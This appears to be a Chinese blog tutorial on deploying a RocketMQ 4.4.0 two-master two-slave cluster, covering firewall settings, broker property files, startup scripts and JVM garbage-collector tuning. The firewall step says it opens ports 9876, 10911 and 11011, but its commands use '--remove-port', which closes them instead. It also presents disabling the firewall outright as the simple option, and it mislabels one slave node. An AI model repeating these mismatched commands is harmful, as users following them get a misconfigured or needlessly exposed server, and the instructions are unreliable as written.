<h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p>宿主机需要远程访问虚拟机的rocketmq服务和web服务，需要开放相关的端口号，简单粗暴的方式是直接关闭防火墙：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld.service </span><br><span class="line"><span class="comment"># 查看防火墙的状态</span></span><br><span class="line">firewall-cmd --state </span><br><span class="line"><span class="comment"># 禁止firewall开机启动</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service</span><br></pre></td></tr></table></figure>

<p>或者为了安全，只开放特定的端口号，RocketMQ默认使用3个端口：9876 、10911 、11011 。如果防火墙没有关闭的话，那么防火墙就必须开放这些端口：</p>
<ul>
<li><code>nameserver</code> 默认使用 9876 端口</li>
<li><code>master</code> 默认使用 10911 端口</li>
<li><code>slave</code> 默认使用11011 端口</li>
</ul>
<p>执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 开放name server默认端口</span></span><br><span class="line">firewall-cmd --remove-port=9876/tcp --permanent</span><br><span class="line"><span class="comment"># 开放master默认端口</span></span><br><span class="line">firewall-cmd --remove-port=10911/tcp --permanent</span><br><span class="line"><span class="comment"># 开放slave默认端口 (当前集群模式可不开启)</span></span><br><span class="line">firewall-cmd --remove-port=11011/tcp --permanent </span><br><span class="line"><span class="comment"># 重启防火墙</span></span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h3 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h3><p>编辑profile文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure>

<p>在末尾加入如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#rocketmq</span></span><br><span class="line">ROCKETMQ_HOME=/usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$ROCKETMQ_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> ROCKETMQ_HOME PATH</span><br></pre></td></tr></table></figure>

<p>保存并退出后， 通过如下命令使配置生效：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> /etc/profile</span><br></pre></td></tr></table></figure>

<h3 id="创建消息存储路径"><a href="#创建消息存储路径" class="headerlink" title="创建消息存储路径"></a>创建消息存储路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /usr/local/rocketmq4.4.0/store</span><br><span class="line"><span class="built_in">mkdir</span> /usr/local/rocketmq4.4.0/store-a</span><br><span class="line"><span class="built_in">mkdir</span> /usr/local/rocketmq4.4.0/store-b</span><br></pre></td></tr></table></figure>

<h3 id="broker配置文件"><a href="#broker配置文件" class="headerlink" title="broker配置文件"></a>broker配置文件</h3><h4 id="master1"><a href="#master1" class="headerlink" title="master1"></a>master1</h4><p>master1在服务器192.168.74.77上，对应broker-a：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /usr/local/rocketmq/conf/2m-2s-<span class="built_in">sync</span>/broker-a.properties</span><br></pre></td></tr></table></figure>

<p>修改配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所属集群名字</span></span><br><span class="line">brokerClusterName=rocketmq-cluster</span><br><span class="line"><span class="comment">#broker名字，同一个组broker的名字相同</span></span><br><span class="line">brokerName=broker-a</span><br><span class="line"><span class="comment">#0 表示 Master，&gt;0 表示 Slave</span></span><br><span class="line">brokerId=0</span><br><span class="line"><span class="comment">#nameServer地址，分号分割</span></span><br><span class="line">namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876</span><br><span class="line"><span class="comment">#在发送消息时，每个Topic默认创建的队列数</span></span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line"><span class="comment">#Broker的ip地址</span></span><br><span class="line">brokerIP1=192.168.74.77</span><br><span class="line"><span class="comment">#Broker 对外服务的监听端口</span></span><br><span class="line">listenPort=10911</span><br><span class="line"><span class="comment">#删除文件时间点，默认凌晨 4点</span></span><br><span class="line">deleteWhen=04</span><br><span class="line"><span class="comment">#文件保留时间，默认 48 小时</span></span><br><span class="line">fileReservedTime=120</span><br><span class="line"><span class="comment">#commitLog每个文件的大小默认1G</span></span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line"><span class="comment">#ConsumeQueue每个文件默认存30W条，根据业务情况调整</span></span><br><span class="line">mapedFileSizeConsumeQueue=300000</span><br><span class="line"><span class="comment">#destroyMapedFileIntervalForcibly=120000</span></span><br><span class="line"><span class="comment">#redeleteHangedFileInterval=120000</span></span><br><span class="line"><span class="comment">#检测物理文件磁盘空间</span></span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line"><span class="comment">#存储路径（同一台服务器上的多个broker不能相同）</span></span><br><span class="line">storePathRootDir=/usr/local/rocketmq4.4.0/store-a</span><br><span class="line"><span class="comment">#commitLog 存储路径</span></span><br><span class="line">storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog</span><br><span class="line"><span class="comment">#消费队列存储路径存储路径</span></span><br><span class="line">storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue</span><br><span class="line"><span class="comment">#消息索引存储路径</span></span><br><span class="line">storePathIndex=/usr/local/rocketmq4.4.0/store/index</span><br><span class="line"><span class="comment">#checkpoint 文件存储路径</span></span><br><span class="line">storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint</span><br><span class="line"><span class="comment">#abort 文件存储路径</span></span><br><span class="line">abortFile=/usr/local/rocketmq4.4.0/store/abort</span><br><span class="line"><span class="comment">#限制的消息大小</span></span><br><span class="line">maxMessageSize=65536</span><br><span class="line"><span class="comment">#flushCommitLogLeastPages=4</span></span><br><span class="line"><span class="comment">#flushConsumeQueueLeastPages=2</span></span><br><span class="line"><span class="comment">#flushCommitLogThoroughInterval=10000</span></span><br><span class="line"><span class="comment">#flushConsumeQueueThoroughInterval=60000</span></span><br><span class="line"><span class="comment">#Broker 的角色</span></span><br><span class="line"><span class="comment">#- ASYNC_MASTER 异步复制Master</span></span><br><span class="line"><span class="comment">#- SYNC_MASTER 同步双写Master</span></span><br><span class="line"><span class="comment">#- SLAVE</span></span><br><span class="line">brokerRole=SYNC_MASTER</span><br><span class="line"><span class="comment">#刷盘方式</span></span><br><span class="line"><span class="comment">#- ASYNC_FLUSH 异步刷盘</span></span><br><span class="line"><span class="comment">#- SYNC_FLUSH 同步刷盘</span></span><br><span class="line">flushDiskType=SYNC_FLUSH</span><br><span class="line"><span class="comment">#checkTransactionMessageEnable=false</span></span><br><span class="line"><span class="comment">#发消息线程池数量</span></span><br><span class="line"><span class="comment">#sendMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#拉消息线程池数量</span></span><br><span class="line"><span class="comment">#pullMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#允许消息过滤</span></span><br><span class="line">enablePropertyFilter=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="slave2"><a href="#slave2" class="headerlink" title="slave2"></a>slave2</h4><p>slave2在服务器192.168.74.77上，对应broker-b-s：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /usr/local/rocketmq/conf/2m-2s-<span class="built_in">sync</span>/broker-b-s.properties</span><br></pre></td></tr></table></figure>

<p>修改配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所属集群名字</span></span><br><span class="line">brokerClusterName=rocketmq-cluster</span><br><span class="line"><span class="comment">#broker名字，同一个组broker的名字相同</span></span><br><span class="line">brokerName=broker-b</span><br><span class="line"><span class="comment">#0 表示 Master，&gt;0 表示 Slave</span></span><br><span class="line">brokerId=1</span><br><span class="line"><span class="comment">#nameServer地址，分号分割</span></span><br><span class="line">namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876</span><br><span class="line"><span class="comment">#在发送消息时，每个Topic默认创建的队列数</span></span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line"><span class="comment">#Broker的ip地址</span></span><br><span class="line">brokerIP1=192.168.74.77</span><br><span class="line"><span class="comment">#Broker 对外服务的监听端口</span></span><br><span class="line">listenPort=11011</span><br><span class="line"><span class="comment">#删除文件时间点，默认凌晨 4点</span></span><br><span class="line">deleteWhen=04</span><br><span class="line"><span class="comment">#文件保留时间，默认 48 小时</span></span><br><span class="line">fileReservedTime=120</span><br><span class="line"><span class="comment">#commitLog每个文件的大小默认1G</span></span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line"><span class="comment">#ConsumeQueue每个文件默认存30W条，根据业务情况调整</span></span><br><span class="line">mapedFileSizeConsumeQueue=300000</span><br><span class="line"><span class="comment">#destroyMapedFileIntervalForcibly=120000</span></span><br><span class="line"><span class="comment">#redeleteHangedFileInterval=120000</span></span><br><span class="line"><span class="comment">#检测物理文件磁盘空间</span></span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line"><span class="comment">#存储路径（同一台服务器上的多个broker不能相同）</span></span><br><span class="line">storePathRootDir=/usr/local/rocketmq4.4.0/store-b</span><br><span class="line"><span class="comment">#commitLog 存储路径</span></span><br><span class="line">storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog</span><br><span class="line"><span class="comment">#消费队列存储路径存储路径</span></span><br><span class="line">storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue</span><br><span class="line"><span class="comment">#消息索引存储路径</span></span><br><span class="line">storePathIndex=/usr/local/rocketmq4.4.0/store/index</span><br><span class="line"><span class="comment">#checkpoint 文件存储路径</span></span><br><span class="line">storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint</span><br><span class="line"><span class="comment">#abort 文件存储路径</span></span><br><span class="line">abortFile=/usr/local/rocketmq4.4.0/store/abort</span><br><span class="line"><span class="comment">#限制的消息大小</span></span><br><span class="line">maxMessageSize=65536</span><br><span class="line"><span class="comment">#flushCommitLogLeastPages=4</span></span><br><span class="line"><span class="comment">#flushConsumeQueueLeastPages=2</span></span><br><span class="line"><span class="comment">#flushCommitLogThoroughInterval=10000</span></span><br><span class="line"><span class="comment">#flushConsumeQueueThoroughInterval=60000</span></span><br><span class="line"><span class="comment">#Broker 的角色</span></span><br><span class="line"><span class="comment">#- ASYNC_MASTER 异步复制Master</span></span><br><span class="line"><span class="comment">#- SYNC_MASTER 同步双写Master</span></span><br><span class="line"><span class="comment">#- SLAVE</span></span><br><span class="line">brokerRole=SLAVE</span><br><span class="line"><span class="comment">#刷盘方式</span></span><br><span class="line"><span class="comment">#- ASYNC_FLUSH 异步刷盘</span></span><br><span class="line"><span class="comment">#- SYNC_FLUSH 同步刷盘</span></span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br><span class="line"><span class="comment">#checkTransactionMessageEnable=false</span></span><br><span class="line"><span class="comment">#发消息线程池数量</span></span><br><span class="line"><span class="comment">#sendMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#拉消息线程池数量</span></span><br><span class="line"><span class="comment">#pullMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#允许消息过滤</span></span><br><span class="line">enablePropertyFilter=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="master2"><a href="#master2" class="headerlink" title="master2"></a>master2</h4><p>master2在服务器192.168.74.88上，对应broker-b：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /usr/local/rocketmq/conf/2m-2s-<span class="built_in">sync</span>/broker-b.properties</span><br></pre></td></tr></table></figure>

<p>修改配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所属集群名字</span></span><br><span class="line">brokerClusterName=rocketmq-cluster</span><br><span class="line"><span class="comment">#broker名字，同一个组broker的名字相同</span></span><br><span class="line">brokerName=broker-b</span><br><span class="line"><span class="comment">#0 表示 Master，&gt;0 表示 Slave</span></span><br><span class="line">brokerId=0</span><br><span class="line"><span class="comment">#nameServer地址，分号分割</span></span><br><span class="line">namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876</span><br><span class="line"><span class="comment">#在发送消息时，每个Topic默认创建的队列数</span></span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line"><span class="comment">#Broker的ip地址</span></span><br><span class="line">brokerIP1=192.168.74.88</span><br><span class="line"><span class="comment">#Broker 对外服务的监听端口</span></span><br><span class="line">listenPort=10911</span><br><span class="line"><span class="comment">#删除文件时间点，默认凌晨 4点</span></span><br><span class="line">deleteWhen=04</span><br><span class="line"><span class="comment">#文件保留时间，默认 48 小时</span></span><br><span class="line">fileReservedTime=120</span><br><span class="line"><span class="comment">#commitLog每个文件的大小默认1G</span></span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line"><span class="comment">#ConsumeQueue每个文件默认存30W条，根据业务情况调整</span></span><br><span class="line">mapedFileSizeConsumeQueue=300000</span><br><span class="line"><span class="comment">#destroyMapedFileIntervalForcibly=120000</span></span><br><span class="line"><span class="comment">#redeleteHangedFileInterval=120000</span></span><br><span class="line"><span class="comment">#检测物理文件磁盘空间</span></span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line"><span class="comment">#存储路径（同一台服务器上的多个broker不能相同）</span></span><br><span class="line">storePathRootDir=/usr/local/rocketmq4.4.0/store-b</span><br><span class="line"><span class="comment">#commitLog 存储路径</span></span><br><span class="line">storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog</span><br><span class="line"><span class="comment">#消费队列存储路径存储路径</span></span><br><span class="line">storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue</span><br><span class="line"><span class="comment">#消息索引存储路径</span></span><br><span class="line">storePathIndex=/usr/local/rocketmq4.4.0/store/index</span><br><span class="line"><span class="comment">#checkpoint 文件存储路径</span></span><br><span class="line">storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint</span><br><span class="line"><span class="comment">#abort 文件存储路径</span></span><br><span class="line">abortFile=/usr/local/rocketmq4.4.0/store/abort</span><br><span class="line"><span class="comment">#限制的消息大小</span></span><br><span class="line">maxMessageSize=65536</span><br><span class="line"><span class="comment">#flushCommitLogLeastPages=4</span></span><br><span class="line"><span class="comment">#flushConsumeQueueLeastPages=2</span></span><br><span class="line"><span class="comment">#flushCommitLogThoroughInterval=10000</span></span><br><span class="line"><span class="comment">#flushConsumeQueueThoroughInterval=60000</span></span><br><span class="line"><span class="comment">#Broker 的角色</span></span><br><span class="line"><span class="comment">#- ASYNC_MASTER 异步复制Master</span></span><br><span class="line"><span class="comment">#- SYNC_MASTER 同步双写Master</span></span><br><span class="line"><span class="comment">#- SLAVE</span></span><br><span class="line">brokerRole=SYNC_MASTER</span><br><span class="line"><span class="comment">#刷盘方式</span></span><br><span class="line"><span class="comment">#- ASYNC_FLUSH 异步刷盘</span></span><br><span class="line"><span class="comment">#- SYNC_FLUSH 同步刷盘</span></span><br><span class="line">flushDiskType=SYNC_FLUSH</span><br><span class="line"><span class="comment">#checkTransactionMessageEnable=false</span></span><br><span class="line"><span class="comment">#发消息线程池数量</span></span><br><span class="line"><span class="comment">#sendMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#拉消息线程池数量</span></span><br><span class="line"><span class="comment">#pullMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#允许消息过滤</span></span><br><span class="line">enablePropertyFilter=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h4 id="slave1"><a href="#slave1" class="headerlink" title="slave1"></a>slave1</h4><p>slave1在服务器192.168.74.88上，对应broker-a-s：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /usr/local/rocketmq/conf/2m-2s-<span class="built_in">sync</span>/broker-a-s.properties</span><br></pre></td></tr></table></figure>

<p>修改配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#所属集群名字</span></span><br><span class="line">brokerClusterName=rocketmq-cluster</span><br><span class="line"><span class="comment">#broker名字，同一个组broker的名字相同</span></span><br><span class="line">brokerName=broker-a</span><br><span class="line"><span class="comment">#0 表示 Master，&gt;0 表示 Slave</span></span><br><span class="line">brokerId=1</span><br><span class="line"><span class="comment">#nameServer地址，分号分割</span></span><br><span class="line">namesrvAddr=rocketmq-nameserver1:9876;rocketmq-nameserver2:9876</span><br><span class="line"><span class="comment">#在发送消息时，每个Topic默认创建的队列数</span></span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建Topic，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateTopicEnable=<span class="literal">true</span></span><br><span class="line"><span class="comment">#是否允许 Broker 自动创建订阅组，建议线下开启，线上关闭</span></span><br><span class="line">autoCreateSubscriptionGroup=<span class="literal">true</span></span><br><span class="line"><span class="comment">#Broker的ip地址</span></span><br><span class="line">brokerIP1=192.168.74.88</span><br><span class="line"><span class="comment">#Broker 对外服务的监听端口</span></span><br><span class="line">listenPort=11011</span><br><span class="line"><span class="comment">#删除文件时间点，默认凌晨 4点</span></span><br><span class="line">deleteWhen=04</span><br><span class="line"><span class="comment">#文件保留时间，默认 48 小时</span></span><br><span class="line">fileReservedTime=120</span><br><span class="line"><span class="comment">#commitLog每个文件的大小默认1G</span></span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line"><span class="comment">#ConsumeQueue每个文件默认存30W条，根据业务情况调整</span></span><br><span class="line">mapedFileSizeConsumeQueue=300000</span><br><span class="line"><span class="comment">#destroyMapedFileIntervalForcibly=120000</span></span><br><span class="line"><span class="comment">#redeleteHangedFileInterval=120000</span></span><br><span class="line"><span class="comment">#检测物理文件磁盘空间</span></span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line"><span class="comment">#存储路径（同一台服务器上的多个broker不能相同）</span></span><br><span class="line">storePathRootDir=/usr/local/rocketmq4.4.0/store-a</span><br><span class="line"><span class="comment">#commitLog 存储路径</span></span><br><span class="line">storePathCommitLog=/usr/local/rocketmq4.4.0/store/commitlog</span><br><span class="line"><span class="comment">#消费队列存储路径存储路径</span></span><br><span class="line">storePathConsumeQueue=/usr/local/rocketmq4.4.0/store/consumequeue</span><br><span class="line"><span class="comment">#消息索引存储路径</span></span><br><span class="line">storePathIndex=/usr/local/rocketmq4.4.0/store/index</span><br><span class="line"><span class="comment">#checkpoint 文件存储路径</span></span><br><span class="line">storeCheckpoint=/usr/local/rocketmq4.4.0/store/checkpoint</span><br><span class="line"><span class="comment">#abort 文件存储路径</span></span><br><span class="line">abortFile=/usr/local/rocketmq4.4.0/store/abort</span><br><span class="line"><span class="comment">#限制的消息大小</span></span><br><span class="line">maxMessageSize=65536</span><br><span class="line"><span class="comment">#flushCommitLogLeastPages=4</span></span><br><span class="line"><span class="comment">#flushConsumeQueueLeastPages=2</span></span><br><span class="line"><span class="comment">#flushCommitLogThoroughInterval=10000</span></span><br><span class="line"><span class="comment">#flushConsumeQueueThoroughInterval=60000</span></span><br><span class="line"><span class="comment">#Broker 的角色</span></span><br><span class="line"><span class="comment">#- ASYNC_MASTER 异步复制Master</span></span><br><span class="line"><span class="comment">#- SYNC_MASTER 同步双写Master</span></span><br><span class="line"><span class="comment">#- SLAVE</span></span><br><span class="line">brokerRole=SLAVE</span><br><span class="line"><span class="comment">#刷盘方式</span></span><br><span class="line"><span class="comment">#- ASYNC_FLUSH 异步刷盘</span></span><br><span class="line"><span class="comment">#- SYNC_FLUSH 同步刷盘</span></span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br><span class="line"><span class="comment">#checkTransactionMessageEnable=false</span></span><br><span class="line"><span class="comment">#发消息线程池数量</span></span><br><span class="line"><span class="comment">#sendMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#拉消息线程池数量</span></span><br><span class="line"><span class="comment">#pullMessageThreadPoolNums=128</span></span><br><span class="line"><span class="comment">#允许消息过滤</span></span><br><span class="line">enablePropertyFilter=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="修改启动脚本文件"><a href="#修改启动脚本文件" class="headerlink" title="修改启动脚本文件"></a>修改启动脚本文件</h3><h4 id="runbroker-sh"><a href="#runbroker-sh" class="headerlink" title="runbroker.sh"></a>runbroker.sh</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /usr/local/rocketmq/bin/runbroker.sh</span><br><span class="line">Bash</span><br><span class="line"><span class="comment"># 开发环境配置 JVM Configuration</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -server -Xms256m -Xmx256m -Xmn128m&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="runserver-sh"><a href="#runserver-sh" class="headerlink" title="runserver.sh"></a>runserver.sh</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /usr/local/rocketmq/bin/runserver.sh</span><br><span class="line">Bash</span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -server -Xms256m -Xmx256m -Xmn128m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h3><h4 id="启动NameServe集群"><a href="#启动NameServe集群" class="headerlink" title="启动NameServe集群"></a>启动NameServe集群</h4><p>分别在192.168.74.77和192.168.74.88启动NameServer：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> mqnamesrv &amp;</span><br></pre></td></tr></table></figure>

<h4 id="启动Broker集群"><a href="#启动Broker集群" class="headerlink" title="启动Broker集群"></a>启动Broker集群</h4><ul>
<li>在192.168.74.77上启动master1和slave2</li>
</ul>
<p>启动master1并指定配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-<span class="built_in">sync</span>/broker-a.properties &amp;</span><br></pre></td></tr></table></figure>

<p>启动slave2并指定配置文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-<span class="built_in">sync</span>/broker-b-s.properties &amp;</span><br></pre></td></tr></table></figure>

<ul>
<li>在192.168.74.88上启动master2和slave2</li>
</ul>
<p>启动master2并指定配置文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-<span class="built_in">sync</span>/broker-b.properties &amp;</span><br></pre></td></tr></table></figure>

<p>启动slave1并指定配置文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> mqbroker -c /usr/local/rocketmq4.4.0/rocketmq-all-4.4.0-bin-release/conf/2m-2s-<span class="built_in">sync</span>/broker-a-s.properties &amp;</span><br></pre></td></tr></table></figure>

<h3 id="查看进程状态"><a href="#查看进程状态" class="headerlink" title="查看进程状态"></a>查看进程状态</h3><p>启动后通过JPS查看启动进程：</p>
<p>每台服务器应该有两个broker和一个nameServer在运行。</p>
<h3 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看nameServer日志</span></span><br><span class="line"><span class="built_in">tail</span> -500f ~/logs/rocketmqlogs/namesrv.log</span><br><span class="line"><span class="comment"># 查看broker日志</span></span><br><span class="line"><span class="built_in">tail</span> -500f ~/logs/rocketmqlogs/broker.log</span><br></pre></td></tr></table></figure>

<h1 id="参数配置"><a href="#参数配置" class="headerlink" title="参数配置"></a>参数配置</h1><p>到这里整个RocketMQ的集群服务就搭建完成了。但是在实际使用时，我们说RocketMQ的吞吐量、性能都很高，那要发挥RocketMQ的高性能，还需要对RocketMQ以及服务器的性能进行定制：</p>
<h2 id="JVM参数"><a href="#JVM参数" class="headerlink" title="JVM参数"></a>JVM参数</h2><p>之前提到过，在<code>runserver.sh</code>中需要定制nameserver的内存大小，在<code>runbroker.sh</code>中需要定制broker的内存大小。这些默认的配置可以认为都是经过检验的最优化配置，但是在实际情况中都还需要根据服务器的实际情况进行调整：</p>
<ul>
<li><code>runbroker.sh</code>中的配置如下</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -server -Xms256m -Xmx256m -Xmn128m&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:+UseG1GC -XX:G1HeapRegionSize=16m -XX:G1ReservePercent=25 -XX:InitiatingHeapOccupancyPercent=30 -XX:SoftRefLRUP</span></span><br><span class="line"><span class="string">olicyMSPerMB=0&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -verbose:gc -Xloggc:/dev/shm/mq_gc_%p.log -XX:+PrintGCDetails -XX:+PrintGCDateStamps -XX:+PrintGCApplicationStoppedTime -XX:+PrintAdaptiveSizePolicy&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:+UseGCLogFileRotation -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=30m&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:-OmitStackTraceInFastThrow&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:+AlwaysPreTouch&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:MaxDirectMemorySize=15g&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:-UseLargePages -XX:-UseBiasedLocking&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以看到对于broker来说：</p>
<ol>
<li><code>-XX:+UseG1GC</code>参数指定使用G1垃圾收集器</li>
<li><code>-XX:G1HeapRegionSize=16m</code>参数将G1的region块大小设为16M</li>
<li><code>-XX:G1ReservePercent=25</code>表示在G1的老年代中预留25%空闲内存，这个默认值是10%，RocketMQ把这个参数调大了。</li>
<li><code>-XX:InitiatingHeapOccupancyPercent=30</code>表示当堆内存的使用率达到30%之后就会启动G1垃圾回收器尝试回收垃圾，默认值是45%，RocketMQ把这个参数调小了。</li>
</ol>
<ul>
<li><code>runserver.sh</code>中的配置如下</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -server -Xms256m -Xmx256m -Xmn128m -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:+UseConcMarkSweepGC -XX:+UseCMSCompactAtFullCollection -XX:CMSInitiatingOccupancyFraction=70 -XX:+CMSParallelRemarkEnabled -XX:SoftRefLRUPolicyMSPerMB=0 -XX:+CMSClassUnloadingEnabled -XX:SurvivorRatio=8  -XX:-UseParNewGC&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -verbose:gc -Xloggc:/dev/shm/rmq_srv_gc.log -XX:+PrintGCDetails&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span> -XX:-OmitStackTraceInFastThrow&quot;</span></span><br><span class="line">JAVA_OPT=<span class="string">&quot;<span class="variable">$&#123;JAVA_OPT&#125;</span>  -XX:-UseLargePages&quot;</span></span><br></pre></td></tr></table></figure>

<p>对于nameserver来说：</p>
<ol>
<li><code>-XX:+UseConcMarkSweepGC</code>参数指定使用CMS垃圾收集器</li>
<li><code>-XX:+UseCMSCompactAtFullCollection</code>参数指定GC后对内存进行压缩整理</li>
<li><code>-XX:CMSInitiatingOccupancyFraction=70</code>参数当老年代内存使用达到70%时会触发Full GC，默认为92%，RocketMQ把这个参数调小了。</li>
